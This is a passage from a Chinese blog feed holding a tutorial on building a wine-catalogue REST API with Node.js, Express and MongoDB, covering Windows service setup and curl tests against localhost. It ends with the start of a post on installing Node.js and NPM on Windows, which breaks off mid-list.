multiparty@<span class="number">3.3</span><span class="number">.2</span>, express-se</span><br><span class="line">ssion@<span class="number">1.7</span><span class="number">.5</span>, csurf@<span class="number">1.4</span><span class="number">.0</span>)</span><br></pre></td></tr></table></figure></p>
<p>执行上述命令后，在winecell文件夹下回创建一个node_modules的文件夹，express就安装在node_modules的子文件夹下。</p>
<p>Express安装完毕后，我们可以为winecell应用程序构建一个基本的REST 接口。</p>
<ol>
<li><p>打开server.js文件，使用以下内容替换掉原来文本中的内容：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.send([&#123;name:<span class="string">'wine1'</span>&#125;, &#123;name:<span class="string">'wine2'</span>&#125;]);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/wines/:id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.send(&#123;id:req.params.id, name: <span class="string">"The Name"</span>, description: <span class="string">"description"</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Listening on port 3000...'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 CTRL+C 停止之前的服务并重启应用服务器： node server.js</p>
</li>
<li>测试API，打开浏览器访问以下URLs：</li>
</ol>
<table>
<thead>
<tr>
<th>获取所有wines的数据</th>
<th><a href="http://localhost:3000/wines" target="_blank" rel="external">http://localhost:3000/wines</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>获取指定id的wine</td>
<td><a href="http://localhost:3000/wines/1" target="_blank" rel="external">http://localhost:3000/wines/1</a></td>
</tr>
</tbody>
</table>
<h4 id="使用Node-js模块">使用Node.js模块</h4><p>在大型应用程序开发中，一般采用模块化的方式来进行项目的开发。我们尝试把wine相关的内容移动到wines模块，再在server.js中使用该模块。</p>
<ol>
<li>在winecell文件夹下创建routes的子文件夹。</li>
<li><p>在routes文件夹下，创建一个wines.js的文件并敲入以下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exports.findAll = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.send([&#123;name:<span class="string">'wine1'</span>&#125;, &#123;name:<span class="string">'wine2'</span>&#125;, &#123;name:<span class="string">'wine3'</span>&#125;]);</span><br><span class="line">&#125;;</span><br><span class="line">exports.findById = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.send(&#123;id:req.params.id, name: <span class="string">"The Name"</span>, description: <span class="string">"description"</span>&#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改server.js文件，使用wines.js模块重新实现，修改后的内容如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> wines = <span class="built_in">require</span>(<span class="string">'./routes/wines'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/wines'</span>, wines.findAll);</span><br><span class="line">app.get(<span class="string">'/wines/:id'</span>, wines.findById);</span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Listening on port 3000...'</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启服务器并测试该API：</p>
</li>
</ol>
<table>
<thead>
<tr>
<th>获取所有wines的数据</th>
<th><a href="http://localhost:3000/wines" target="_blank" rel="external">http://localhost:3000/wines</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>获取指定id的wine</td>
<td><a href="http://localhost:3000/wines/1" target="_blank" rel="external">http://localhost:3000/wines/1</a></td>
</tr>
</tbody>
</table>
<p>下一步是从MongoDB数据库的实际数据替换在wines.js中写死的数据。</p>
<h4 id="安装MongoDB">安装MongoDB</h4><p> 各个平台上MongoDB的安装可参考 <a href="http://docs.mongodb.org/manual/installation/" target="_blank" rel="external">MongoDB QuickStart</a><br>Win7上安装MongoDB的方法：</p>
<ol>
<li>到<a href="http://www.mongodb.org/downloads" target="_blank" rel="external">MongoDB官网</a>下载适合自己平台的安装版本，我这里下载的是win7 32bit的版本，msi安装格式，直接下载单击安装即可。在向导页面中选择的是典型安装，当然你可以根据自己的需求，可选择自定义安装或者全部安装。</li>
<li>安装结束后默认是放在C盘目录下，我把它拷贝到D盘目录下，放到 D:\Program Files\MongoDB 的目录下。</li>
<li>在 D:\Program Files\MongoDB 目录下创建data文件夹，并在data文件夹下创建 db 和 log 的子文件夹。</li>
<li><p>创建配置文件，该配置文件可以包含MongoDB的各种配置选项。这里，我们只配置数据库路径以及log文件路径。操作方法：在命令行中敲入以下命令（需要管理员权限）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\MongoDB\bin&gt;<span class="built_in">echo</span> logpath=<span class="string">"D:\Program Files\MongoDB\data\log\MongoDB.log"</span>&gt; <span class="string">"D:\Program Files\MongoDB\mongod.cfg"</span></span><br><span class="line">D:\Program Files\MongoDB\bin&gt;<span class="built_in">echo</span> dbpath=<span class="string">"D:\Program Files\MongoDB\data\db"</span>&gt;&gt; <span class="string">"D:\Program Files\MongoDB\mongod.cfg"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建MongoDB作为系统服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\MongoDB\bin&gt;sc.exe create MongoDB binPath= <span class="string">"\"D:\Program Files\</span><br><span class="line">MongoDB\bin\mongod.exe\" --service --config=\"D:\Program Files\MongoDB\mongod.cf</span><br><span class="line">g\""</span> DisplayName= <span class="string">"MongoDB 2.6 Standard"</span> start= <span class="string">"auto"</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>如果成功创建，则在CMD中会如下打印：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SC] CreateService SUCCESS</span><br></pre></td></tr></table></figure></p>
<ol>
<li>启动MongoDB服务<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="winutils">net</span> <span class="built_in">start</span> MongoDB</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在我的环境上MongoDB服务未能正常启动，出现了如下问题：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">bin</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">MongoDB</span></span><br><span class="line">服务没有响应控制功能。</span><br><span class="line">请键入 <span class="title">NET</span> <span class="title">HELPMSG</span> 2186 以获得更多的帮助。</span></span><br></pre></td></tr></table></figure></p>
<p>MongoDB服务不能启动的解决方法：</p>
<ol>
<li><p>先将MongoDB服务删除：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">bin</span>&gt;<span class="title">sc.exe</span> <span class="title">delete</span> <span class="title">MongoDB</span></span><br><span class="line">[<span class="title">SC</span>] <span class="title">DeleteService</span> 成功</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>按照下面的方法从新配置数据库路径以及log路径，服务正常启动；</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">bin</span>&gt;<span class="title">mongod</span> --<span class="title">dbpath</span> "<span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">data</span>" --<span class="title">l</span></span><br><span class="line"><span class="title">ogpath</span> "<span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">data</span>\<span class="title">log</span>\<span class="title">MongoDB.log</span>" --<span class="title">logappend</span> --<span class="title">serviceName</span></span><br><span class="line"> <span class="title">MongoDB</span> --<span class="title">auth</span> --<span class="title">install</span></span><br><span class="line">2014-08-16<span class="title">T22</span>:48:06.257+0800</span><br><span class="line">2014-08-16<span class="title">T22</span>:48:06.260+0800 <span class="title">warning</span>: 32-<span class="title">bit</span> <span class="title">servers</span> <span class="title">don</span>'<span class="title">t</span> <span class="title">have</span> <span class="title">journaling</span> <span class="title">enabl</span></span><br><span class="line"><span class="title">ed</span> <span class="title">by</span> <span class="title">default</span>. <span class="title">Please</span> <span class="title">use</span> --<span class="title">journal</span> <span class="title">if</span> <span class="title">you</span> <span class="title">want</span> <span class="title">durability</span>.</span><br><span class="line">2014-08-16<span class="title">T22</span>:48:06.260+0800</span><br><span class="line"><span class="title">D</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">MongoDB</span>\<span class="title">bin</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">MongoDB</span></span><br><span class="line"><span class="title">MongoDB</span> 服务正在启动 .</span><br><span class="line"><span class="title">MongoDB</span> 服务已经启动成功。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果要停止MongoDB服务，可使用： net stop MongoDB</p>
</li>
</ol>
<p>注： 官方的安装说明可参考这里： <a href="http://docs.mongodb.org/manual/tutorial/install-mongodb-on-windows/" target="_blank" rel="external">http://docs.mongodb.org/manual/tutorial/install-mongodb-on-windows/</a></p>
<h4 id="安装Node-js的MongoDB驱动">安装Node.js的MongoDB驱动</h4><p>Node.js有不同的解决方案提供了不同层次的抽象来访问MongoDB数据库。例如 <a href="http://mongoosejs.com/" target="_blank" rel="external">Mongoose</a> 和 <a href="https://github.com/masylum/mongolia" target="_blank" rel="external">Mongolia</a> 。本文不会讨论两种解决方案的比较。我们即将讨论的是 <a href="http://docs.mongodb.org/ecosystem/drivers/node-js/" target="_blank" rel="external">native Node.js driver</a>。</p>
<p>通过命令行来安装Nodejs的本地MongoDB驱动：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g mongodb</span><br></pre></td></tr></table></figure></p>
<h4 id="实现REST_API">实现REST API</h4><p>winecell应用程序的全部REST API包含如下方法：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>URL</th>
<th>动作</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/wines</td>
<td>Retrieve all wines</td>
</tr>
<tr>
<td>GET</td>
<td>/wines/5069b47aa892630aae000001</td>
<td>Retrieve the wine with the specified _id</td>
</tr>
<tr>
<td>POST</td>
<td>/wines</td>
<td>Add a new wine</td>
</tr>
<tr>
<td>PUT</td>
<td>/wines/5069b47aa892630aae000001</td>
<td>Update wine with the specified _id</td>
</tr>
<tr>
<td>DELETE</td>
<td>/wines/5069b47aa892630aae000001</td>
<td>Delete the wine with the specified _id</td>
</tr>
</tbody>
</table>
<p>API的需求需要实现上述几种路由操作，修改server.js文件，具体如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> wines = <span class="built_in">require</span>(<span class="string">'./routes/wines'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.configure(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	app.use(express.logger(<span class="string">'dev'</span>));</span><br><span class="line">	app.use(express.bodyParser());</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">'/wines'</span>, wines.findAll);</span><br><span class="line">app.get(<span class="string">'/wines/:id'</span>, wines.findById);</span><br><span class="line">app.post(<span class="string">'/wines'</span>, wines.addWine);</span><br><span class="line">app.put(<span class="string">'/wines/:id'</span>, wines.updateWine);</span><br><span class="line">app.delete(<span class="string">'/wines/:id'</span>, wines.deleteWine);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Listening on port 3000...'</span>);</span><br></pre></td></tr></table></figure></p>
<p>为每个路由操作提供数据访问逻辑，修改wines.js文件，具体如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mongo =<span class="built_in">require</span>(<span class="string">'mongodb'</span>);</span><br><span class="line"><span class="keyword">var</span> Server = mongo.Server,</span><br><span class="line">	Db = mongo.Db,</span><br><span class="line">	BSON = mongo.BSONPure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> Server(<span class="string">'localhost'</span>, <span class="number">27107</span>, &#123;auto_reconnect: <span class="literal">true</span>&#125;);</span><br><span class="line">db = <span class="keyword">new</span> Db(<span class="string">'winedb'</span>, server);</span><br><span class="line"></span><br><span class="line">db.open(<span class="function"><span class="keyword">function</span>(<span class="params">err, db</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!err)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"Connected to 'winedb' database"</span>);</span><br><span class="line">		db.collection(<span class="string">'wines'</span>, &#123;strict:<span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(err)&#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">"The 'wines' collection doesn't exist. Creating it  Creating it with sample data..."</span>);</span><br><span class="line">				populateDB();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">exports.findAll = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>)</span>&#123;</span><br><span class="line">		collection.find().toArray(<span class="function"><span class="keyword">function</span>(<span class="params">err, items</span>)</span>&#123;</span><br><span class="line">			res.send(items);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">exports.findById = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> id = req.params.id;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'Retrieving wine:'</span> + id);</span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>)</span>&#123;</span><br><span class="line">		collection.findOne(&#123;<span class="string">'_id'</span>:<span class="keyword">new</span> BSON.ObjectID(id)&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, item</span>)</span>&#123;</span><br><span class="line">			res.send(item);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">exports.addWine = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> wine = req.body;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'Adding wine: '</span> + <span class="built_in">JSON</span>.stringify(wine));</span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">		collection.insert(wine, &#123;safe:<span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				res.send(&#123;<span class="string">'error'</span>:<span class="string">'An error has occurred'</span>&#125;);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">'Success: '</span> + <span class="built_in">JSON</span>.stringify(result[<span class="number">0</span>]));</span><br><span class="line">				res.send(result[<span class="number">0</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.updateWine = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> id = req.params.id;</span><br><span class="line">	<span class="keyword">var</span> wine = req.body;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'Updating wine: '</span> + id);</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(wine));</span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">		collection.update(&#123;<span class="string">'_id'</span>:<span class="keyword">new</span> BSON.ObjectID(id)&#125;, wine, &#123;safe:<span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">'Error updating wine: '</span> + err);</span><br><span class="line">				res.send(&#123;<span class="string">'error'</span>:<span class="string">'An error has occurred'</span>&#125;);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">''</span> + result + <span class="string">' document(s) updated'</span>);</span><br><span class="line">				res.send(wine);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exports.deleteWine = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> id = req.params.id;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'Deleting wine: '</span> + id);</span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">		collection.remove(&#123;<span class="string">'_id'</span>:<span class="keyword">new</span> BSON.ObjectID(id)&#125;, &#123;safe:<span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (err) &#123;</span><br><span class="line">				res.send(&#123;<span class="string">'error'</span>:<span class="string">'An error has occurred - '</span> + err&#125;);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">''</span> + result + <span class="string">' document(s) deleted'</span>);</span><br><span class="line">				res.send(req.body);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> populateDB = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">var</span> wines = [</span><br><span class="line">	&#123;</span><br><span class="line">		name: <span class="string">"CHATEAU DE SAINT COSME"</span>,</span><br><span class="line">		year: <span class="string">"2009"</span>,</span><br><span class="line">		grapes: <span class="string">"Grenache / Syrah"</span>,</span><br><span class="line">		country: <span class="string">"France"</span>,</span><br><span class="line">		region: <span class="string">"Southern Rhone"</span>,</span><br><span class="line">		description: <span class="string">"The aromas of fruit and spice..."</span>,</span><br><span class="line">		picture: <span class="string">"saint_cosme.jpg"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	&#123;</span><br><span class="line">		name: <span class="string">"LAN RIOJA CRIANZA"</span>,</span><br><span class="line">		year: <span class="string">"2006"</span>,</span><br><span class="line">		grapes: <span class="string">"Tempranillo"</span>,</span><br><span class="line">		country: <span class="string">"Spain"</span>,</span><br><span class="line">		region: <span class="string">"Rioja"</span>,</span><br><span class="line">		description: <span class="string">"A resurgence of interest in boutique vineyards..."</span>,</span><br><span class="line">		picture: <span class="string">"lan_rioja.jpg"</span></span><br><span class="line">	&#125;];</span><br><span class="line"> </span><br><span class="line">	db.collection(<span class="string">'wines'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">		collection.insert(wines, &#123;safe:<span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>重启服务，测试API接口。</p>
<h4 id="使用cURL测试API">使用cURL测试API</h4><p>重启 server.js 服务，通过浏览器来测试REST服务。在浏览器中输入以下地址：<br><a href="http://localhost:3000/wines" target="_blank" rel="external">http://localhost:3000/wines</a><br>但是，通过浏览器访问只能测试到GET服务，有什么其他的方法可以覆盖到之前我们提供的REST接口吗？使用cURL小工具可以胜任这个工作。<br>例如，使用cURL，通过以下命令，你可以测试 winecell API。</p>
<ul>
<li>获取所有的酒<br>curl -i -X GET <a href="http://localhost:3000/wines" target="_blank" rel="external">http://localhost:3000/wines</a> </li>
<li>获取_id为 5069b47aa892630aae000007 的酒<br>curl -i -X GET <a href="http://localhost:3000/wines/5069b47aa892630aae000007" target="_blank" rel="external">http://localhost:3000/wines/5069b47aa892630aae000007</a> </li>
<li>删除_id为 5069b47aa892630aae000007 的酒<br>curl -i -X DELETE <a href="http://localhost:3000/wines/5069b47aa892630aae000007" target="_blank" rel="external">http://localhost:3000/wines/5069b47aa892630aae000007</a> </li>
<li>添加新酒<br>curl -i -X POST -H ‘Content-Type: application/json’ -d ‘{“name”: “New Wine”, “year”: “2009”}’ <a href="http://localhost:3000/wines" target="_blank" rel="external">http://localhost:3000/wines</a> </li>
<li>修改_id为5069b47aa892630aae000007 的酒的信息<br>curl -i -X PUT -H ‘Content-Type: application/json’ -d ‘{“name”: “New Wine”, “year”: “2010”}’ <a href="http://localhost:3000/wines/5069b47aa892630aae000007" target="_blank" rel="external">http://localhost:3000/wines/5069b47aa892630aae000007</a> </li>
</ul>
<p>原文地址：<a href="http://coenraets.org/blog/2012/10/creating-a-rest-api-using-node-js-express-and-mongodb/" target="_blank" rel="external">http://coenraets.org/blog/2012/10/creating-a-rest-api-using-node-js-express-and-mongodb/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="C:\Users\le\Downloads\nodemango1.jpg" alt="nodeMongo"><br>]]>
    
    </summary>
    
      <category term="Express" scheme="http://science09.github.io/tags/Express/"/>
    
      <category term="MongoDB" scheme="http://science09.github.io/tags/MongoDB/"/>
    
      <category term="Node.js" scheme="http://science09.github.io/tags/Node-js/"/>
    
      <category term="WEB" scheme="http://science09.github.io/categories/WEB/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows平台下Node.js的安装]]></title>
    <link href="http://science09.github.io/2014/09/03/Windows%E5%B9%B3%E5%8F%B0%E4%B8%8BNode-js%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>http://science09.github.io/2014/09/03/Windows平台下Node-js的安装/</id>
    <published>2014-09-03T13:31:21.000Z</published>
    <updated>2015-09-10T13:48:39.000Z</updated>
    <content type="html"><![CDATA[<h4 id="1-Windows平台下Node-js的安装">1.Windows平台下Node.js的安装</h4><p>Node.js从V0.6.X的稳定版本后开始支持Windows平台上直接安装，不需要通过Cygwin或MinGW模拟Linux环境。直接到Node.js的官方网站上下载 <a href="http://www.nodejs.org/download/" target="_blank" rel="external">http://www.nodejs.org/download/</a> ,Windows平台上提供两种安装包格式： .msi 和 .exe 。这里我们选择 .msi安装包格式，下载下来后直接安装，无需其他配置，简单快速。<br><a id="more"></a><br>安装完毕后，可以在快速启动栏中找到 “Node.js command prompt” 命令行窗口，单击后调用该窗口，敲入以下命令：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure></p>
<p>命令行将打印出：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v0<span class="number">.10</span><span class="number">.30</span></span><br></pre></td></tr></table></figure></p>
<pre><code><span class="comment">PS：</span> <span class="comment">windows源码安装比价麻烦，如果你喜欢折腾，可以试一试。需要Python环境和VC</span><span class="literal">+</span><span class="literal">+</span><span class="comment">编译器。</span>
</code></pre><p>经过上面的步骤，算是把Nodejs的环境搭建好了。接下来安装Windows下的Node.js包管理工具，Nodejs采用NPM（Node Package Manager）。Nodejs自身提供了基本的模块，但是在这些基本模块上开发实际应用需要较多的工作。所幸的是笔者执笔此文的时候NPM上已经有了5112个Nodejs库或框架，这些库从各个方面可以帮助Nodejs的开发者完成较为复杂的应用。这些库的数量和活跃也从侧面反映出Nodejs社区的发展是十分神速和活跃的。</p>
<h4 id="2-Windows下安装NPM">2.Windows下安装NPM</h4><ul>
<li>安装Git工具<br>由于github网站不支持直接下载打包了所有submodule的源码包，所以需要通过git工具来签出所有的源码。从 <a href="http://code.google.com/p/msysgit/downloads/list" target="_blank" rel="external">http://code.google.com/p/msysgit/downloads/list</a>，可以下载到msysgit这个Windows平台下的git客户端工具，在下载之后双击安装。</li>
<li><p>下载NPM源码<br>打开命令行工具（CMD），执行以下命令，可以通过msysgit检出NPM的所有源码和依赖代码并安装npm。</p>
